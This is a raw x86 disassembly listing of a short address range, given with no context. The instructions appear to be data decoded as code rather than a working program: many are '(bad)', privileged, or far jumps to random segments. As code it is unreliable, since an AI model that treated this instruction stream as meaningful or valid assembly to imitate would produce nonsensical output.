  418576:	cmp    BYTE PTR [esi-0x66b9fb63],bl
  41857c:	loope  0x418556
  41857e:	mov    bh,0x16
  418580:	loope  0x4185df
  418582:	or     BYTE PTR [eax+ebx*1-0x449d6fae],al
  418589:	sahf   
  41858a:	pop    esp
  41858b:	popf   
  41858c:	adc    edx,DWORD PTR fs:[esi+0x47f9d92c]
  418593:	add    DWORD PTR [edx],edi
  418595:	fs in  al,dx
  418597:	loopne 0x4185d7
  418599:	cmp    ebp,DWORD PTR [edi-0x7eaf8f87]
  41859f:	lods   al,BYTE PTR ds:[esi]
  4185a0:	sbb    BYTE PTR [ecx],ah
  4185a2:	xlat   BYTE PTR ds:[ebx]
  4185a3:	loopne 0x418592
  4185a5:	pop    esp
  4185a6:	sub    dh,BYTE PTR [edi]
  4185a8:	dec    edx
  4185a9:	ins    BYTE PTR es:[edi],dx
  4185aa:	jge    0x4185f1
  4185ac:	fwait
  4185ad:	jmp    0x165798c0
  4185b2:	in     al,dx
  4185b3:	ss xchg edx,eax
  4185b5:	mov    esi,0xb6fa4b00
  4185ba:	out    dx,al
  4185bb:	popa   
  4185bc:	mov    ch,0xab
  4185be:	lods   eax,DWORD PTR ds:[esi]
  4185bf:	inc    ecx
  4185c0:	mov    cl,BYTE PTR [edi+edi*8-0xf]
  4185c4:	sahf   
  4185c5:	pusha  
  4185c6:	jecxz  0x418633
  4185c8:	adc    eax,esi
  4185ca:	fcomi  st,st(2)
  4185cc:	inc    esp
  4185cd:	scas   al,BYTE PTR es:[edi]
  4185ce:	mov    edi,DWORD PTR [edx+0x7158af39]
  4185d4:	sub    DWORD PTR [edi-0x80],edx
  4185d7:	adc    eax,0x33eb6562
  4185dc:	stos   BYTE PTR es:[edi],al
  4185dd:	leave  
  4185de:	mov    eax,0xb0cf4f3a
  4185e3:	lahf   
  4185e4:	ja     0x418636
  4185e6:	add    ebx,edi
  4185e8:	leave  
  4185e9:	push   eax
  4185ea:	scas   al,BYTE PTR es:[edi]
  4185eb:	dec    ecx
  4185ec:	iret   
  4185ed:	(bad)  
  4185ee:	cli    
  4185ef:	xor    edx,eax
  4185f1:	icebp  
  4185f2:	imul   ebp,DWORD PTR [eax],0x4d
  4185f5:	aad    0xd1
  4185f7:	jb     0x418642
  4185f9:	xchg   ebp,eax
  4185fa:	popf   
  4185fb:	pop    ebx
  4185fc:	shl    BYTE PTR [edx-0x24],0x70
  418600:	and    al,0x6
  418602:	or     dh,BYTE PTR [ebx+0x38c59753]
  418608:	cmp    DWORD PTR [eax],ecx
  41860a:	inc    ebx
  41860b:	div    BYTE PTR [esi+ecx*2-0x1d]
  41860f:	inc    esp
  418610:	lods   eax,DWORD PTR ds:[esi]
  418611:	mov    ebx,0x495363da
  418616:	mov    DWORD PTR [ecx],edx
  418618:	adc    ebx,DWORD PTR [esi+0x1f]
  41861b:	mov    ebp,0xa17feb96
  418620:	cld    
  418621:	jbe    0x4185ec
  418623:	dec    ecx
  418624:	out    0x1,al
  418626:	jecxz  0x4185ab
  418628:	or     ebp,DWORD PTR [esi+0x77]
  41862b:	test   DWORD PTR [ecx-0x4b40bc08],edi
  418631:	outs   dx,DWORD PTR ds:[esi]
  418632:	sti    
  418633:	int    0xf1
  418635:	je     0x41862a
  418637:	push   ss
  418638:	mov    bl,0xd
  41863a:	sub    cl,BYTE PTR [eax+0x42a10536]
  418640:	adc    DWORD PTR [esi+0x4c],edx
  418643:	enter  0x45e1,0x2
  418647:	xor    DWORD PTR [ebp-0x14],0x969799be
  41864e:	dec    edi
  41864f:	mov    eax,0x22cad49b
  418654:	sbb    DWORD PTR [ebp-0x5b],edi
  418657:	(bad)  
  418658:	push   esi
  418659:	push   edx
  41865a:	scas   eax,DWORD PTR es:[edi]
  41865b:	fsubp  st(5),st
  41865d:	add    DWORD PTR [edi+0x5f],ecx
  418660:	cmp    al,0x29
  418662:	setb   dl
  418665:	loopne 0x418698
  418667:	enter  0xe5fb,0x89
  41866b:	adc    BYTE PTR [ebx-0x194d8c0a],bl
  418671:	shl    esi,1
  418673:	nop
  418674:	cdq    
  418675:	mov    ebx,0x6184794f
  41867a:	and    al,0x3c
  41867c:	cmp    BYTE PTR [edi-0x3570174d],al
  418682:	pop    edx
  418683:	jno    0x41867d
  418685:	mov    esi,0x1b059523
  41868a:	lock (bad) 
  41868c:	int3   
  41868d:	outs   dx,BYTE PTR ds:[esi]
  41868e:	xchg   esp,eax
  41868f:	push   ss
  418690:	jae    0x4186e4
  418692:	jmp    0x43de5f4c
  418697:	push   edi
  418698:	jno    0x418646
  41869a:	fnstenv [eax]
  41869c:	popa   
  41869d:	ret    
  41869e:	clc    
  41869f:	test   ah,bl
  4186a1:	jmp    0x5bbf:0xbb3faa1a
  4186a8:	xor    BYTE PTR [esi],dh
  4186aa:	(bad)  
  4186ab:	adc    edx,DWORD PTR [esi]
  4186ad:	xchg   ebx,eax
  4186ae:	es mov edx,edi
  4186b1:	(bad)  
  4186b3:	or     edx,0xb5d5f340
  4186b9:	inc    esi
  4186ba:	and    ecx,esi
  4186bc:	in     eax,0x98
  4186be:	gs cwde 
  4186c0:	adc    esi,0xf4b80457
  4186c6:	sub    edi,edx
  4186c8:	xchg   ebx,eax
  4186c9:	adc    DWORD PTR [edx+0x385c8a0b],edi
  4186cf:	jmp    0x41865e
  4186d1:	dec    ebx
  4186d2:	pop    ebp
  4186d3:	test   edi,ebx
  4186d5:	aaa    
  4186d6:	xchg   bl,ch
  4186d8:	dec    eax
  4186d9:	sub    bl,dh
  4186db:	push   ebp
  4186dc:	adc    eax,0x324ba1b3
  4186e1:	xchg   ebp,eax
  4186e2:	test   eax,0x22099057
  4186e7:	or     esp,DWORD PTR [ebx+0x5f61a701]
  4186ed:	into   
  4186ee:	mov    edi,0x51712529
  4186f3:	pushf  
  4186f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4186f5:	push   edi
  4186f6:	jl     0x4186ec
  4186f8:	xchg   esp,eax
  4186f9:	int    0x8d
  4186fb:	call   0xf7d9:0x3affce69
  418702:	mov    esi,0xc5e4a7cf
  418707:	sbb    BYTE PTR [esi-0x1460b617],bl
  41870d:	hlt    
  41870e:	jp     0x418772
  418710:	mul    DWORD PTR [eax+0x9383deb]
  418716:	(bad)  
  418717:	jge    0x41874a
  418719:	push   edx
  41871a:	sbb    ecx,DWORD PTR [esi-0x3f148f2c]
  418720:	int3   
  418721:	mov    fs,ebx
  418723:	jo     0x418749
  418725:	jle    0x41872b
  418727:	popa   
  418728:	push   es
  418729:	gs retf 0xa539
  41872d:	aam    0xfa
  41872f:	(bad)  
  418730:	adc    edi,DWORD PTR [edx-0x5a]
  418733:	xlat   BYTE PTR ds:[ebx]
  418734:	mov    edi,0x456657e
  418739:	js     0x418731
  41873b:	cli    
  41873c:	pop    ecx
  41873d:	or     ebp,DWORD PTR [edx-0x6b59ca8c]
  418743:	fst    DWORD PTR [edi]
  418745:	(bad)  
  418746:	xchg   ecx,eax
  418747:	ret    
  418748:	sbb    al,0xec
  41874a:	icebp  
  41874b:	sbb    al,BYTE PTR [edx+ebx*8]
  41874e:	dec    esp
  41874f:	dec    ebx
  418750:	stc    
  418751:	mov    dh,0xf0
  418753:	lahf   
  418754:	add    ch,bh
  418756:	cs xchg edx,eax
  418758:	loop   0x4186fd
  41875a:	gs (bad) 
  41875c:	cmc    
  41875d:	inc    edi
  41875e:	lods   al,BYTE PTR ds:[esi]
  41875f:	and    eax,0xef7fd233
  418764:	pop    es
  418765:	sub    DWORD PTR [eax],0x3e976318
  41876b:	jb     0x418757
  41876d:	xor    DWORD PTR [ebp-0x5],0x50c9a01c
  418774:	xor    bl,ah
  418776:	inc    eax
  418777:	std    
  418778:	jbe    0x4187a8
  41877a:	test   al,0x2e
  41877c:	daa    
  41877d:	or     BYTE PTR [edx+0x35948e72],ch
  418783:	out    0x66,eax
  418785:	xchg   esi,eax
  418786:	mov    BYTE PTR [ebx],dh
  418788:	xchg   esi,eax
  418789:	lds    esi,FWORD PTR [ebp+0xa332862]
  41878f:	jbe    0x4187e2
  418791:	shl    BYTE PTR [esi+ecx*1],1
  418794:	and    ah,BYTE PTR [eax-0x55]
  418797:	loop   0x418744
  418799:	shl    DWORD PTR [ecx-0xd9509d5],cl
  41879f:	adc    DWORD PTR [edi-0x38],ebx
  4187a2:	mov    DWORD PTR [ebp+0xe],eax
  4187a5:	adc    eax,0x9d5dc99c
  4187aa:	adc    al,0xa3
  4187ac:	enter  0xbbef,0xb8
  4187b0:	xchg   esi,eax
  4187b1:	pushf  
  4187b2:	stc    
  4187b3:	jmp    0x59c3835a
  4187b8:	ins    DWORD PTR es:[edi],dx
  4187b9:	xlat   BYTE PTR ds:[ebx]
  4187ba:	push   esp
  4187bb:	or     eax,DWORD PTR [eax]
  4187bd:	adc    bl,al
  4187bf:	(bad)  
  4187c0:	mov    cl,0x85
  4187c2:	cs push ecx
  4187c4:	or     al,0xdc
  4187c6:	daa    
  4187c7:	push   edx
  4187c8:	cmc    
  4187c9:	push   ebp
  4187ca:	sti    
  4187cb:	rcr    BYTE PTR [eax],1
  4187cd:	cmp    eax,0xb1a92ca2
  4187d3:	xchg   di,ax
  4187d5:	push   eax
  4187d6:	mul    BYTE PTR [esi+0xc]
  4187d9:	inc    ebx
  4187da:	add    DWORD PTR [esp+ecx*4],ebx
  4187dd:	sbb    BYTE PTR [eax-0x5e55e6c3],bh
  4187e3:	xor    al,0x5b
  4187e5:	call   0xfddf:0x9c5b851d
  4187ec:	stos   BYTE PTR es:[edi],al
  4187ed:	call   0xe509:0xd9e10d9d
  4187f4:	ins    DWORD PTR es:[edi],dx
  4187f5:	into   
  4187f6:	clc    
  4187f7:	push   cs
  4187f8:	and    ah,dl
  4187fa:	adc    eax,0xcbfcbd60
  4187ff:	xchg   ecx,eax
  418800:	push   es
  418801:	jne    0x4187ec
  418803:	lea    esp,[ebp-0x31024ebe]
  418809:	jg     0x4187aa
  41880b:	test   al,0xfb
  41880d:	lea    esp,[eax-0x4681cbab]
  418813:	inc    esi
  418814:	pop    esi
  418815:	fldenv [edi]
  418817:	sbb    ebx,DWORD PTR [ecx]
  418819:	jnp    0x4187cb
  41881b:	inc    edx
  41881c:	aad    0xe3
  41881e:	test   eax,0x1da5db7
  418823:	add    BYTE PTR ds:0x17b4b0ed,bl
  418829:	inc    edi
  41882a:	repz les esp,FWORD PTR es:[edx]
  41882e:	dec    esi
  41882f:	mov    eax,ds:0xbf8c387b
  418834:	jo     0x418822
  418836:	mov    esi,edx
  418838:	jle    0x418872
  41883a:	cmp    eax,ecx
  41883c:	stc    
  41883d:	sbb    al,0xe9
  41883f:	cmp    eax,0x6a5300a1
  418844:	jmp    0x25fa:0x7c204a48
  41884b:	outs   dx,DWORD PTR ds:[esi]
  41884c:	pop    ss
  41884d:	ror    DWORD PTR [ebp+0x7e],0x84
  418851:	cmp    ax,0x924b
  418855:	and    al,0xe6
  418857:	inc    DWORD PTR [ecx]
  418859:	icebp  
  41885a:	fiadd  DWORD PTR [edx+0x3335886a]
  418860:	mov    BYTE PTR [ecx-0x2f8d44ff],dh
  418866:	psllw  mm5,QWORD PTR [edx+0x18d41edb]
  41886d:	out    0x1a,al
  41886f:	mov    al,ds:0x5de57729
  418874:	and    dh,BYTE PTR [ecx-0x7d1f2dc6]
  41887a:	fisttp WORD PTR [ebp-0x36]
  41887d:	loopne 0x418807
  41887f:	wrmsr  
  418881:	jge    0x418821
  418883:	test   al,0x26
  418885:	xchg   esp,eax
  418886:	xor    al,BYTE PTR [ebx]
  418888:	pop    eax
  418889:	add    DWORD PTR [eax+0x141386ae],esi
  41888f:	repnz or al,0x35
  418892:	mov    edi,0x508d4b7e
  418897:	mov    ecx,0x7d43a546
  41889c:	cmp    dh,cl
  41889e:	fdivrp st(7),st
  4188a0:	mov    gs,WORD PTR [ebp+0x604a9645]
  4188a6:	inc    edi
  4188a7:	arpl   ax,sp
  4188a9:	outs   dx,BYTE PTR ds:[esi]
  4188aa:	jle    0x4188ac
  4188ac:	cmp    DWORD PTR [edx+0xd1ea6bd],ebx
  4188b2:	pop    ebp
  4188b3:	mov    edi,0x2a1425c
  4188b8:	fstp   st(6)
  4188ba:	sub    al,0x31
  4188bc:	adc    al,dl
  4188be:	mov    bh,0x49
  4188c0:	adc    DWORD PTR [ecx+0x4ea4544d],ebp
  4188c6:	xchg   ebp,esp
  4188c8:	retf   0x2ccd
  4188cb:	adc    eax,0x262b26c2
  4188d0:	aam    0x37
  4188d2:	fild   DWORD PTR [ebp-0x21006994]
  4188d8:	mov    ?,WORD PTR [eax]
  4188da:	push   es
  4188db:	xchg   ebp,eax
  4188dc:	mov    ah,0x6
  4188de:	popa   
  4188df:	fucomi st,st(1)
  4188e1:	aas    
  4188e2:	push   0x58
  4188e4:	sbb    BYTE PTR [eax-0x63],ah
  4188e7:	popf   
  4188e8:	sub    DWORD PTR [edi-0x57],edi
  4188eb:	xchg   ebp,eax
  4188ec:	and    eax,0xd237c7f0
  4188f1:	mov    edi,0x50b44dbd
  4188f6:	push   cs
  4188f7:	sub    al,0xa9
  4188f9:	cli    
  4188fa:	aam    0xd7
  4188fc:	int    0x35
  4188fe:	xchg   edx,eax
  4188ff:	into   
  418900:	mov    ebx,0xb1252a92
  418905:	test   eax,0x46d9873e
  41890a:	inc    ebx
  41890b:	pop    ds
  41890c:	mov    ds:0xb528f2e5,al
  418911:	push   0xffffffe2
  418913:	ret    
  418914:	push   esi
  418915:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418916:	addr16 sub ecx,edx
  418919:	aam    0x81
  41891b:	jmp    0x30af:0x7e9422f
  418922:	cmp    eax,0xa77c43d9
  418927:	or     dl,al
  418929:	imul   edx,DWORD PTR [esi-0x2b],0x27
  41892d:	xchg   DWORD PTR [esp+edi*2+0xe9382f5],esi
  418934:	push   ss
  418935:	or     BYTE PTR [esi+0x77],dh
  418938:	jns    0x418938
  41893a:	sti    
  41893b:	cmp    al,0x3f
  41893d:	mov    ah,BYTE PTR [eax+ebp*4]
  418940:	popf   
  418941:	test   ecx,0x2ca6d7d8
  418947:	cmc    
  418948:	sub    eax,DWORD PTR [edi+0x6cfc033]
  41894e:	out    dx,eax
  41894f:	cmc    
  418950:	push   0xb6e62bd2
  418955:	xchg   BYTE PTR [esi-0x3e158204],bl
  41895b:	imul   esp,ecx,0x4427456b
  418961:	pop    ds
  418962:	dec    esi
  418963:	fnsetpm(287 only) 
  418965:	mov    ds:0x5b3e4089,al
  41896a:	and    eax,ecx
  41896c:	(bad)  
  41896d:	scas   eax,DWORD PTR es:[edi]
  41896e:	mov    WORD PTR [ebx+0x7b35c86d],?
  418974:	jnp    0x4189b6
  418976:	mov    ebx,0xfb5c503f
  41897b:	mov    edx,0x1a1742af
  418980:	jae    0x4189bd
  418982:	jae    0x418909
  418984:	xlat   BYTE PTR ds:[ebx]
  418985:	and    eax,0xa3b77378
  41898a:	or     ebp,DWORD PTR [edi-0xacec2bf]
  418990:	int3   
  418991:	push   ebx
  418992:	lea    edi,[edi+0x17075f7d]
  418998:	sub    BYTE PTR ds:0xa6f6e962,dh
  41899e:	in     eax,0x1f
  4189a0:	or     DWORD PTR [esi],ecx
  4189a2:	and    eax,0x63870f74
  4189a7:	test   eax,0x4fd86a84
  4189ac:	in     al,dx
  4189ad:	cdq    
  4189ae:	or     al,0xe8
  4189b0:	fldcw  WORD PTR [edi+0x61]
  4189b3:	imul   ebx,DWORD PTR [edx+0x5547d536],0xbf126108
  4189bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189be:	xchg   esi,eax
  4189bf:	push   eax
  4189c0:	dec    esi
  4189c1:	jle    0x4189ab
  4189c3:	xor    eax,0x6b459f8b
  4189c8:	push   eax
  4189c9:	les    esi,FWORD PTR [eax-0x46]
  4189cc:	scas   al,BYTE PTR es:[edi]
  4189cd:	pop    ebx
  4189ce:	scas   eax,DWORD PTR es:[edi]
  4189cf:	es add al,al
  4189d2:	sub    ch,BYTE PTR [edi-0x51dcaad]
  4189d8:	xchg   esp,eax
  4189d9:	mov    dh,0x13
  4189db:	sti    
  4189dc:	cmp    cl,BYTE PTR [edi+0x2e]
  4189df:	js     0x418975
  4189e1:	test   al,0x28
  4189e3:	arpl   cx,bx
  4189e5:	dec    ecx
  4189e6:	frstor [eax*2-0x4175991a]
  4189ed:	stc    
  4189ee:	ins    DWORD PTR es:[edi],dx
  4189ef:	sti    
  4189f0:	es xchg esi,eax
  4189f2:	inc    ebx
  4189f3:	adc    bh,ch
  4189f5:	das    
  4189f6:	lods   al,BYTE PTR ds:[esi]
  4189f7:	and    al,BYTE PTR [esi+0x23de40b1]
  4189fd:	inc    eax
  4189fe:	xchg   BYTE PTR [edx],al
  418a00:	add    dh,BYTE PTR [eax]
  418a02:	cwde   
  418a03:	and    al,0x7d
  418a05:	xchg   ebx,eax
  418a06:	dec    esi
  418a07:	call   0xc142:0x1a90ba1d
  418a0e:	mov    edi,0x8bf2d548
  418a13:	and    eax,0xfc55b3f2
  418a18:	xor    bl,BYTE PTR [eax]
  418a1a:	in     eax,dx
  418a1b:	daa    
  418a1c:	mov    DWORD PTR [eax-0x4802343a],ecx
  418a22:	inc    ebp
  418a23:	dec    eax
  418a24:	mov    eax,0xe7e7b2d6
  418a29:	push   ebp
  418a2a:	jge    0x418a79
  418a2c:	int    0x5a
  418a2e:	xor    eax,0x65dce4e8
  418a33:	ror    DWORD PTR [ecx+0x48],1
  418a36:	jnp    0x4189ca
  418a38:	aas    
  418a39:	js     0x4189bb
  418a3b:	mov    DWORD PTR [ebx+0x2],esp
  418a3e:	adc    BYTE PTR [ebx],al
  418a40:	mov    dh,0x12
  418a42:	sbb    eax,DWORD PTR [ecx-0x22]
  418a45:	add    eax,0x2a88f386
  418a4a:	out    dx,eax
  418a4b:	mov    al,ds:0x1d8da8a3
  418a50:	and    ebp,DWORD PTR [edx+0x41]
  418a53:	retf   0x9993
  418a56:	push   ss
  418a57:	(bad)  
  418a58:	jle    0x418a6c
  418a5a:	in     al,0x41
  418a5c:	out    0xc1,al
  418a5e:	das    
  418a5f:	outs   dx,DWORD PTR ss:[esi]
  418a61:	mov    ebx,ebx
  418a63:	sub    DWORD PTR [ecx+esi*1],edi
  418a66:	iret   
  418a67:	data16 (bad) 
  418a69:	pop    esi
  418a6a:	jno    0x418ad4
  418a6c:	not    DWORD PTR [edx-0x1feec47e]
  418a72:	rcl    BYTE PTR [edx+0x7385255b],1
  418a78:	int3   
  418a79:	ss push ecx
  418a7b:	mov    DWORD PTR [edx+0x7442763b],esi
  418a81:	sbb    al,ch
  418a83:	jge    0x418a34
  418a85:	ss push ds
  418a87:	idiv   esp
  418a89:	jle    0x418a6b
  418a8b:	scas   eax,DWORD PTR es:[edi]
  418a8c:	fbstp  TBYTE PTR [eax+0x17585a8a]
  418a92:	inc    ecx
  418a93:	mov    ebx,0xf86ffaf0
  418a98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a99:	loope  0x418a85
  418a9b:	cmc    
  418a9c:	mov    ah,0xc2
  418a9e:	or     al,0x7e
  418aa0:	addr16 mov ah,0xe2
  418aa3:	loop   0x418a91
  418aa5:	dec    edi
  418aa6:	bound  ecx,QWORD PTR [edi-0x7be0f91a]
  418aac:	or     edx,ebx
  418aae:	adc    ebp,ebx
  418ab0:	dec    ebp
  418ab1:	or     ch,BYTE PTR [edi+0x4aa630ba]
  418ab7:	out    0x95,eax
  418ab9:	dec    esi
  418aba:	arpl   di,sp
  418abc:	dec    eax
  418abd:	(bad)  
  418abf:	hlt    
  418ac0:	xchg   DWORD PTR [ecx],edi
  418ac2:	rol    DWORD PTR [ecx-0x7d73a71c],0x2
  418ac9:	out    dx,al
  418aca:	in     al,0x3c
  418acc:	mov    edi,ebp
  418ace:	loopne 0x418ad4
  418ad0:	loopne 0x418aed
  418ad2:	fdiv   DWORD PTR [ecx-0x5d10ba4e]
  418ad8:	repnz fild DWORD PTR [ebx-0x7f]
  418adc:	dec    esp
  418add:	data16 (bad) [eax]
  418ae0:	icebp  
  418ae1:	xchg   edx,eax
  418ae2:	mov    bh,BYTE PTR [ebx+edx*1]
  418ae5:	sbb    al,0xb0
  418ae7:	adc    eax,0x2587f74c
  418aec:	stos   BYTE PTR es:[edi],al
  418aed:	fmul   QWORD PTR [eax+0x5c]
  418af0:	arpl   bp,cx
  418af2:	pop    ecx
  418af3:	dec    ecx
  418af4:	mov    bh,0x70
  418af6:	jle    0x418adf
  418af8:	jmp    0xcbc2914e
  418afd:	jne    0x418abb
  418aff:	jno    0x418b74
  418b01:	pop    esi
  418b02:	pop    ebp
  418b03:	xor    BYTE PTR [esi],ch
  418b05:	(bad)  
  418b06:	jnp    0x418b60
  418b08:	neg    BYTE PTR [ebp+0x18cf8f96]
  418b0e:	ret    
  418b0f:	sub    bh,al
  418b11:	ins    DWORD PTR es:[edi],dx
  418b12:	mul    DWORD PTR [esi+ebx*4-0x226cf2c1]
  418b19:	or     ebp,DWORD PTR ds:0xc889d9f6
  418b1f:	xchg   DWORD PTR [ecx-0xe562648],esp
  418b25:	int3   
  418b26:	jp     0x418b5c
  418b28:	adc    eax,0x4d856608
  418b2d:	xor    al,0x26
  418b2f:	dec    edx
  418b30:	ret    
  418b31:	push   edx
  418b32:	leave  
  418b33:	adc    cl,BYTE PTR [edi+0x5689d75d]
  418b39:	pop    ecx
  418b3a:	test   BYTE PTR [ebx],ah
  418b3c:	je     0x418ae7
  418b3e:	xchg   ebx,eax
  418b3f:	push   edx
  418b40:	ss mov al,0xfa
  418b43:	stc    
  418b44:	pop    ds
  418b45:	jae    0x418afd
  418b47:	xchg   bh,dl
  418b49:	loopne 0x418b70
  418b4b:	ins    BYTE PTR es:[edi],dx
  418b4c:	shl    bh,0x96
  418b4f:	xlat   BYTE PTR ds:[ebx]
  418b50:	mov    esi,0xb20cbae6
  418b55:	cmc    
  418b56:	lock outs dx,DWORD PTR ds:[esi]
  418b58:	ret    0xc509
  418b5b:	mov    esp,0x6a61992d
  418b60:	ror    BYTE PTR [ebx],0xdd
  418b63:	inc    esi
  418b64:	xchg   ecx,eax
  418b65:	sub    eax,eax
  418b67:	jp     0x418b0f
  418b69:	(bad)  
  418b6b:	mov    bh,ah
  418b6d:	daa    
  418b6e:	test   eax,0x5de4c015
  418b73:	scas   eax,DWORD PTR es:[edi]
  418b74:	push   ebx
  418b75:	std    
  418b76:	inc    edi
  418b77:	mov    al,ds:0x63b3f1bd
  418b7c:	xchg   ah,ch
  418b7e:	xchg   ebp,eax
  418b7f:	dec    ebx
  418b80:	jp     0x418bf4
  418b82:	js     0x418bbd
  418b84:	adc    bh,BYTE PTR [ecx-0x6cf751b1]
  418b8a:	mov    dl,0x2f
  418b8c:	mov    DWORD PTR [edi+0x4e],esp
  418b8f:	inc    esi
  418b90:	rol    BYTE PTR [ebx-0x29],cl
  418b93:	(bad)  
  418b94:	jp     0x418bf9
  418b96:	test   al,bl
  418b98:	inc    edx
  418b99:	mov    ch,0xf
  418b9b:	jg     0x418bc0
  418b9d:	je     0x418b91
  418b9f:	test   ch,bl
  418ba1:	jle    0x418b76
  418ba3:	lds    ecx,FWORD PTR [eax-0x2a]
  418ba6:	out    0x90,al
  418ba8:	mov    edi,0xcd9983ff
  418bad:	retf   0x3d29
  418bb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bb1:	cmp    al,cl
  418bb3:	jmp    0x2edb:0xe58ab602
  418bba:	mov    edx,0x475c2d02
  418bbf:	cmp    ch,BYTE PTR [edx]
  418bc1:	mov    edx,0x85fc2536
  418bc6:	fcom   QWORD PTR [ecx-0x49ebb264]
  418bcc:	test   eax,0x9cdf1f05
  418bd1:	data16 das 
  418bd3:	js     0x418bcf
  418bd5:	push   0xf0e553bf
  418bda:	retf   
  418bdb:	inc    edi
  418bdc:	mov    dh,0xde
  418bde:	and    BYTE PTR [ecx],0x59
  418be1:	push   edx
  418be2:	pop    eax
  418be3:	shr    BYTE PTR [ebx+0x4a],cl
  418be6:	sub    DWORD PTR [edx+ecx*4],esp
  418be9:	mov    ah,0xad
  418beb:	mov    bh,0xd2
  418bed:	test   al,0x53
  418bef:	pop    ds
  418bf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bf1:	push   ebx
  418bf2:	push   edi
  418bf3:	mov    edi,0x55ad7956
  418bf8:	push   ebx
  418bf9:	and    ebx,DWORD PTR [ecx+0x23]
  418bfc:	repz jbe 0x418c40
  418bff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c00:	ror    DWORD PTR [eax+ebx*2+0x37165fe],1
  418c07:	xchg   edi,eax
  418c08:	mov    ?,WORD PTR [edx+0x4c85c5b5]
  418c0e:	add    ebx,0x4745c568
  418c14:	sub    DWORD PTR [edi-0x1c],esi
  418c17:	cmp    DWORD PTR [edx+0xf],ebx
  418c1a:	or     eax,0x62978b26
  418c1f:	imul   ecx,DWORD PTR [ecx+0x4f27c729],0xffffffce
  418c26:	adc    al,cl
  418c28:	loop   0x418c2c
  418c2a:	aam    0x1a
  418c2c:	sbb    esi,DWORD PTR [edi+0x41]
  418c2f:	jae    0x418c00
  418c31:	(bad)  
  418c32:	pushf  
  418c33:	mov    ds:0xf6f19bc8,al
  418c38:	paddsw mm4,QWORD PTR [ecx+0x3314e69e]
  418c3f:	add    eax,0xcfe42ed4
  418c44:	jp     0x418c06
  418c46:	push   edx
  418c47:	outs   dx,BYTE PTR ds:[esi]
  418c48:	inc    eax
  418c49:	addr16 test ebx,esp
  418c4c:	gs enter 0xdcf5,0xb8
  418c51:	shl    esp,cl
  418c53:	ins    BYTE PTR es:[edi],dx
  418c54:	mov    ecx,0x1a327999
  418c59:	pop    eax
  418c5a:	push   ecx
  418c5b:	fldcw  WORD PTR [ebx+0x17]
  418c5e:	xor    al,0x5b
  418c60:	test   al,0x86
  418c62:	xor    al,BYTE PTR [ebp-0x12]
  418c65:	pop    DWORD PTR [ecx]
  418c67:	inc    ebx
  418c68:	add    edi,DWORD PTR [edi-0x41]
  418c6b:	aad    0xee
  418c6d:	xchg   BYTE PTR [ebp+0x3b],cl
  418c70:	popa   
  418c71:	std    
  418c72:	xchg   esi,eax
  418c73:	repz aam 0xb3
  418c76:	daa    
  418c77:	inc    esi
  418c78:	jmp    0x418c9b
  418c7a:	xchg   edx,eax
  418c7b:	pop    esi
  418c7c:	sahf   
  418c7d:	xor    al,0x9
  418c7f:	add    eax,0x384ddd79
  418c84:	xchg   edi,eax
  418c85:	shl    BYTE PTR [edi+0x2f],1
  418c88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c89:	mov    cl,0x8
  418c8b:	sbb    al,dh
  418c8d:	(bad)  
  418c8e:	in     eax,0xcc
  418c90:	in     eax,0x23
  418c92:	enter  0xb762,0x64
  418c96:	jmp    0x50726e3f
  418c9b:	cwde   
  418c9c:	sub    eax,0x84b96731
  418ca1:	(bad)  
  418ca2:	sub    al,0x88
  418ca4:	pushf  
  418ca5:	xchg   bl,bl
  418ca7:	cwde   
  418ca8:	jno    0x418c64
  418caa:	(bad)  
  418cab:	adc    eax,0x42d3839c
  418cb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cb1:	mov    al,0xc6
  418cb3:	dec    edi
  418cb4:	(bad)  
  418cb6:	adc    BYTE PTR [ebp+0xf],bl
  418cb9:	adc    cl,BYTE PTR [edi]
  418cbb:	sub    DWORD PTR [ecx-0x2b],edx
  418cbe:	push   cs
  418cbf:	loopne 0x418c6e
  418cc1:	sub    edi,DWORD PTR [ecx]
  418cc3:	sti    
  418cc4:	dec    ebx
  418cc5:	push   DWORD PTR ds:0xb6473ce5
  418ccb:	(bad)  
  418ccc:	cdq    
  418ccd:	pop    esp
  418cce:	mov    ch,0x49
  418cd0:	aas    
  418cd1:	xor    eax,DWORD PTR [esi+0x5b]
  418cd4:	outs   dx,BYTE PTR ds:[esi]
  418cd5:	push   0xffffffa9
  418cd7:	jmp    0x90e0e269
  418cdc:	test   eax,0x45faf29f
  418ce1:	mov    edi,0xa8638e28
  418ce6:	pop    ecx
  418ce7:	loopne 0x418d27
  418ce9:	jp     0x418ce5
  418ceb:	retf   0x720b
  418cee:	mov    cl,0xb
  418cf0:	sub    BYTE PTR [ebx+eax*2+0x1eb27c8c],bl
  418cf7:	ret    
  418cf8:	rcr    DWORD PTR ds:0xde545e02,cl
  418cfe:	imul   ebx,edi,0x38
  418d01:	xor    BYTE PTR [esi],ah
  418d03:	mov    ds:0x1c848f6d,al
  418d08:	and    eax,0xad25080d
  418d0d:	lock inc esi
  418d0f:	into   
  418d10:	stos   BYTE PTR es:[edi],al
  418d11:	jle    0x418d46
  418d13:	pop    ecx
  418d14:	popa   
  418d15:	setb   bl
  418d18:	fst    DWORD PTR [ecx+0x6ba83dad]
  418d1e:	in     eax,dx
  418d1f:	int3   
  418d20:	xor    DWORD PTR [edi],edi
  418d22:	sbb    al,0x72
  418d24:	sar    BYTE PTR [ebx+0x45],1
  418d27:	lahf   
  418d28:	ins    DWORD PTR es:[edi],dx
  418d29:	dec    BYTE PTR [eax]
  418d2b:	mov    esi,gs
  418d2d:	mov    ch,0x16
  418d2f:	sub    al,0x68
  418d31:	and    ecx,esp
  418d33:	cld    
  418d34:	stos   BYTE PTR es:[edi],al
  418d35:	mov    dh,0x21
  418d37:	stos   BYTE PTR es:[edi],al
  418d38:	mov    cl,0x8c
  418d3a:	les    esi,FWORD PTR [edx]
  418d3c:	call   0xea19:0x1e77ae59
  418d43:	push   ss
  418d44:	jmp    0x9f4256d3
  418d49:	repnz push ss
  418d4b:	pop    ds
